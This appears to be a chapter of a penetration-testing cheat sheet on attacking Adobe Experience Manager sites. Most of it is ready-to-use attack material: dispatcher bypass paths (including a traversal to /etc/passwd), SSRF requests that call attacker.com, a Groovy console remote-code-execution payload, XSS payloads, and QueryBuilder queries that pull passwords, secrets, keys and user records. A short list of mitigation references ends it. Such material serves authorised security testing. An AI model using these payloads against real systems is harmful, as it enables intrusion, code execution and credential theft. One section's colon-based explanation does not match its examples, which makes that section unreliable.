# 28. AEM (Adobe Experience Manager) Misconfigurations

AEM is a popular CMS and digital-experience platform from Adobe. It exposes a large attack surface through Sling servlets, dispatcher misconfigurations, and a long list of historical CVEs.

## AEM hacker — primary tool

```
https://github.com/0ang3el/aem-hacker
```

```bash
python aem_hacker.py -u https://target.com --host attacker.com
python aem_ssrf_hunter.py -u https://target.com --host attacker.com
```

## Dispatcher bypass tricks

The Apache Sling dispatcher is the front-line filter that decides which requests reach AEM. The following tricks routinely bypass weak dispatcher rules:

```
/path.css/a.html
/path.html/a.css
/path.json/a.css
/path/a.1.json
/path/a.json/b.css
/path;%0a/a.css
/path/a.json/../../etc/passwd
/path.json%20
/path.json%00
/path.json#a.css
/path.json?a.css
```

## CVE-2016-0957 — AEM Dispatcher cache poisoning

Adobe AEM Dispatcher up to 4.2.3 — abuse the `:` (colon) character in URLs to break path filters and reach internal endpoints.

```
GET /etc/clientcontext/default/contentloader.json/a.css HTTP/1.1
GET /libs/cq/security/userinfo.json/a.css HTTP/1.1
```

## Servlet bypasses

AEM ships with hundreds of servlets registered by path or by selector. The dispatcher tries to filter dangerous ones (e.g. `MergeMetadataServlet`, `WCMDebugFilter`, `SetUserPropertiesServlet`). Common bypasses:

- Add an extension: `/bin/querybuilder.json.css`
- Add a selector: `/bin/querybuilder.json.1.json`
- Path traversal in the servlet selector: `/bin/querybuilder.json/a.1.json/b.css`
- Use `;%0a` as a separator: `/bin/querybuilder.json;%0a.css`

## Useful endpoints to fingerprint AEM

```
/system/console/bundles
/system/console/configMgr
/system/console/status-Bundlelist.json
/system/console/jmx
/system/console/profiler
/etc/clientcontext/default/contentloader.json
/libs/cq/core/content/welcome.html
/libs/cq/security/userinfo.json
/libs/granite/core/content/login.html
/libs/granite/security/currentuser.json
/etc.json
/.json
/.tidy.json
/.infinity.json
/.children.json
/.tidy.infinity.json
```

## SSRF through AEM features

### Opensocial proxy SSRF

```
GET /libs/opensocial/proxy?url=http://attacker.com/&container=default
GET /libs/opensocial/makeRequest?url=http://attacker.com/&container=default
```

### `reportingservices` SSRF

```
GET /libs/cq/contentsync/content/console.html?path=http://attacker.com/
```

### `SalesforceSecretServlet` / OAuth SSRF

```
GET /bin/wcm/oauth/code?host=attacker.com
```

### Dispatcher SSRF via flush

```
POST /dispatcher/invalidate.cache
CQ-Action: Activate
CQ-Handle: //attacker.com
```

## Groovy console RCE

If `/system/console/groovyconsole` (or `/etc/groovyconsole`) is exposed, run arbitrary Groovy code:

```groovy
def proc = "id".execute()
proc.waitFor()
println proc.in.text
```

```
POST /system/console/groovyconsole/post.json
script=Runtime.getRuntime().exec("id")
```

## XSS

### `WCMDebugFilter` reflected XSS (CVE-2016-7882)

```
GET /content/page.html?debug=layout&t=<svg/onload=alert(1)>
```

### `cqdamcomponents` XSS

```
GET /etc/dam/cqdam.commons.foundation.parsys.html?content=<svg/onload=alert(1)>
```

## JCR secret extraction

QueryBuilder is the easiest way to find secrets in the JCR repository:

```
GET /bin/querybuilder.json?path=/etc&type=nt:unstructured&p.limit=-1
GET /bin/querybuilder.json?type=cq:Page&p.hits=full&p.limit=-1
GET /bin/querybuilder.json?path=/&1_property=password&1_property.operation=exists&p.limit=-1
GET /bin/querybuilder.json?path=/&1_property=secret&1_property.operation=exists&p.limit=-1
GET /bin/querybuilder.json?path=/&1_property=key&1_property.operation=exists&p.limit=-1
```

## Useful QueryBuilder selectors

```
/bin/querybuilder.json?path=/etc/users&p.hits=full&p.limit=-1
/bin/querybuilder.json?path=/home/users&p.hits=full&p.limit=-1
/bin/querybuilder.json?path=/etc/replication&p.hits=full&p.limit=-1
/bin/querybuilder.feed?path=/&type=rep:User&p.hits=full
```

## Mitigation references

- Adobe AEM Dispatcher Security Checklist
- 0ang3el's BlackHat talk: "Hacking AEM sites"
- AEM hardening guide (Adobe Help)
